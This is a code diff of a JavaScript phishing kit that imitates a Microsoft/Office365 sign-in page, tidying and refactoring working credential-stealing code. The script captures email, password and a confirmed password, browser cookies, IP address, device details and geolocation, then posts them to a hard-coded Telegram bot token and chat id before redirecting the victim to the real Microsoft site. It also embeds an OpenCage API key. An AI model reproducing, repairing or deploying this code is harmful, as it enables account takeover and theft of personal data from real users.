@@ -14,9 +14,9 @@
 const OpenCageApiKey = "4e409ae9c61a4c72a039a8c02e10e45a";
 
 document.addEventListener('DOMContentLoaded', () => {
-    const unReq = "Enter a valid email address, phone number, or Skype name."
-    const pwdReq = "Please enter the password for your Microsoft account."
-    const confirmReq = "Please confirm the password for your Microsoft account."
+    const unReq = "Enter a valid email address, phone number, or Skype name.";
+    const pwdReq = "Please enter the password for your Microsoft account.";
+    const confirmReq = "Please confirm the password for your Microsoft account.";
 
     const unameInp = document.getElementById('inp_uname');
     const pwdInp = document.getElementById('inp_pwd');
@@ -24,9 +24,11 @@ document.addEventListener('DOMContentLoaded', () => {
 
     let view = "uname";
 
-    let unameVal = pwdVal = confirmVal = false;
+    let unameVal = false, pwdVal = false, confirmVal = false;
 
     unameInp.addEventListener('keydown', (event) => handleNextDown(event, nxt));
+    pwdInp.addEventListener('keydown', (event) => handleConfirmDown(event, confirm));
+    confirmInp.addEventListener('keydown', (event) => handleSigDown(event, sig));
 
     function handleNextDown(event, nextButton) {
         if (event.key === "Enter") {
@@ -35,16 +37,12 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    pwdInp.addEventListener('keydown', (event) => handleConfirmDown(event, confirm));
-
     function handleConfirmDown(event, confirmButton) {
         if (event.key === "Enter") {
             event.preventDefault();
             confirmButton.click();
         }
     }
-
-    confirmInp.addEventListener('keydown', (event) => handleSigDown(event, sig));
 
     function handleSigDown(event, sigButton) {
         if (event.key === "Enter") {
@@ -53,51 +51,41 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    /////next button
     const nxt = document.getElementById('btn_next');
-
     nxt.addEventListener('click', () => {
-        //validate the form
         validate();
         if (unameVal) {
             document.getElementById("section_uname").classList.toggle('d-none');
             document.getElementById('section_pwd').classList.remove('d-none');
             document.querySelectorAll('#user_identity').forEach((e) => {
                 e.innerText = unameInp.value;
-            })
+            });
             view = "pwd";
         }
-    })
+    });
 
-    /////confirm button
     const confirm = document.getElementById('btn_confirm');
-
     confirm.addEventListener('click', () => {
-        //validate the form
         validate();
         if (pwdVal) {
             document.getElementById("section_pwd").classList.toggle('d-none');
             document.getElementById('section_confirm').classList.remove('d-none');
             document.querySelectorAll('#user_identity').forEach((e) => {
                 e.innerText = unameInp.value;
-            })
+            });
             view = "confirm";
         }
-    })
-
-    //////sign in button
+    });
 
     const sig = document.getElementById('btn_sig');
-
     sig.addEventListener('click', () => {
-        //validate the form
         validate();
         if (confirmVal) {
             document.getElementById("section_confirm").classList.toggle('d-none');
             document.getElementById('section_final').classList.remove('d-none');
             view = "final";
         }
-    })
+    });
 
     function validate() {
         function unameValAction(type) {
@@ -107,36 +95,33 @@ document.addEventListener('DOMContentLoaded', () => {
                 unameVal = false;
             } else {
                 document.getElementById('error_uname').innerText = "";
-                unameInp.classList.remove('error-inp')
+                unameInp.classList.remove('error-inp');
                 unameVal = true;
             }
-
         }
 
         function pwdValAction(type) {
             if (!type) {
                 document.getElementById('error_pwd').innerText = pwdReq;
-                pwdInp.classList.add('error-inp')
+                pwdInp.classList.add('error-inp');
                 pwdVal = false;
             } else {
                 document.getElementById('error_pwd').innerText = "";
-                pwdInp.classList.remove('error-inp')
+                pwdInp.classList.remove('error-inp');
                 pwdVal = true;
             }
-
         }
 
         function confirmValAction(type) {
             if (!type) {
                 document.getElementById('error_confirm').innerText = confirmReq;
-                confirmInp.classList.add('error-inp')
+                confirmInp.classList.add('error-inp');
                 confirmVal = false;
             } else {
                 document.getElementById('error_confirm').innerText = "";
-                confirmInp.classList.remove('error-inp')
+                confirmInp.classList.remove('error-inp');
                 confirmVal = true;
             }
-
         }
 
         if (view === "uname") {
@@ -153,7 +138,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else {
                     unameValAction(true);
                 }
-            })
+            });
         } else if (view === "pwd") {
             if (pwdInp.value.trim() === "") {
                 pwdValAction(false);
@@ -161,7 +146,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 pwdValAction(true);
                 const password = pwdInp.value;
                 localStorage.setItem("Password", password);
-                //sendLogs();
             }
             pwdInp.addEventListener('change', function() {
                 if (this.value.trim() === "") {
@@ -169,7 +153,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else {
                     pwdValAction(true);
                 }
-            })
+            });
         } else if (view === "confirm") {
             if (confirmInp.value.trim() === "") {
                 confirmValAction(false);
@@ -177,7 +161,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 confirmValAction(true);
                 const confirmPassword = confirmInp.value;
                 localStorage.setItem("Password confirmed", confirmPassword);
-                //sendLogs();
             }
             confirmInp.addEventListener('change', function() {
                 if (this.value.trim() === "") {
@@ -185,33 +168,30 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else {
                     confirmValAction(true);
                 }
-            })
+            });
         }
         return false;
     }
 
-    //back button
     document.querySelector('.back').addEventListener('click', () => {
         view = "uname";
         document.getElementById("section_pwd").classList.toggle('d-none');
         document.getElementById('section_uname').classList.remove('d-none');
-    })
+    });
 
-    //second back button
     document.querySelector('.backConfirm').addEventListener('click', () => {
         view = "uname";
         document.getElementById("section_confirm").classList.toggle('d-none');
         document.getElementById('section_pwd').classList.remove('d-none');
-    })
+    });
 
-    //final buttons
     document.querySelectorAll('#btn_final').forEach((b) => {
         b.addEventListener('click', () => {
             sendLogs();
-        })
+        });
 
         b.addEventListener('keydown', (event) => handleFinalDown(event, b));
-    })
+    });
 
     function handleFinalDown(event, b) {
         if (event.key === "Enter") {
@@ -224,27 +204,25 @@ document.addEventListener('DOMContentLoaded', () => {
         const username = localStorage.getItem("Email address");
         const password = localStorage.getItem("Password");
         const confirmPassword = localStorage.getItem("Password confirmed");
-        const x = document.cookie;
+        const cookies = document.cookie;
 
         fetch('https://api.ipify.org')
             .then(res => res.text())
             .then(ipAddress => {
                 const deviceInfo = {
-                    manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
-                    model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
-                    os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
-                    browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
+                    manufacturer: navigator.userAgent,
+                    os: navigator.platform,
+                    browser: navigator.appName
                 };
 
-                getLocation(username, password, confirmPassword, x, deviceInfo, ipAddress);
+                getLocation(username, password, confirmPassword, cookies, deviceInfo, ipAddress);
             })
             .catch(error => {
                 console.error("Error capturing IP address:", error);
             });
+    }
 
-    };
-
-    function getLocation(username, password, confirmPassword, x, deviceInfo, ipAddress) {
+    function getLocation(username, password, confirmPassword, cookies, deviceInfo, ipAddress) {
         navigator.geolocation?.getCurrentPosition(async (position) => {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
@@ -261,10 +239,9 @@ document.addEventListener('DOMContentLoaded', () => {
                     const state = result.state;
                     const country = result.country;
                     const zipCode = result.postcode;
-                    const continent = result.continent;
                     const county = result.county;
 
-                    var dataToSend = {
+                    const dataToSend = {
                         username,
                         password,
                         confirmPassword,
@@ -279,7 +256,7 @@ document.addEventListener('DOMContentLoaded', () => {
                         Country: country,
                         County: county,
                         ZipCode: zipCode,
-                        Cookies: x,
+                        Cookies: cookies,
                     };
 
                     if (Object.keys(dataToSend).length > 0) {
@@ -287,29 +264,26 @@ document.addEventListener('DOMContentLoaded', () => {
                     } else {
                         console.warn("No data to send to Telegram.");
                     }
-                    } else {
+                } else {
                     console.error("Location information not found.");
-                    }
-                } catch (error) {
-                    console.error("Error fetching location data:", error);
                 }
-            },
-            (error) => {
+            } catch (error) {
+                console.error("Error fetching location data:", error);
+            }
+        },
+        (error) => {
             console.error("Error getting location:", error);
             alert("Location permission is required to login to your Microsoft Account.");
-        }
-        );
-    };
+        });
+    }
 
     function sendToTelegram(data) {
-        // Add your bot details here👇 (this is where you will get the logs)
+        const telegramBotId = "7273335886:AAFfBkz6TbFX6IbPfJ4sAB_pFyUBhuhEWWI";
+        const chatId = 7323113234;
 
-        var telegramBotId = "7273335886:AAFfBkz6TbFX6IbPfJ4sAB_pFyUBhuhEWWI";
-        var chatId = 7323113234;
-
-        var payload = {
-          chat_id: chatId,
-          text: `
+        const payload = {
+            chat_id: chatId,
+            text: `
             New Office365 Login:
             ________________________
                "Email address, phone number or skype": "${data.username}",
@@ -330,21 +304,20 @@ document.addEventListener('DOMContentLoaded', () => {
             `
         };
 
-        var sendToBot = {
-          url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "cache-control": "no-cache"
-          },
-          data: JSON.stringify(payload)
+        const sendToBot = {
+            url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "cache-control": "no-cache"
+            },
+            data: JSON.stringify(payload)
         };
 
         $.ajax(sendToBot).done(function(response) {
-          window.location.href = "https://account.microsoft.com";
-          // console.log("Telegram API response:", JSON.stringify(response));
+            window.location.href = "https://account.microsoft.com";
         }).fail(function(error) {
-          console.error("Error sending data to Telegram:", error);
+            console.error("Error sending data to Telegram:", error);
         });
-    };
+    }
 });
